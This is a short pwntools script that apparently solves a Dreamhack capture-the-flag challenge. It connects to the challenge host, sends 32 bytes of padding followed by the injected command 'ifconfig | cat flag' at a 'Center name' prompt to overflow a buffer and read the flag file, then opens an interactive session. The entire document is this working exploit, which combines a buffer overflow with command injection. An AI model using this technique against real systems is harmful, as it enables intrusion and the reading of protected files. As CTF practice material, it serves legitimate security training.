from pwn import *

p=remote('host3.dreamhack.games', 13450)

p.sendlineafter(b'Center name: ', 'A'*32+'ifconfig | cat flag')

p.interactive()
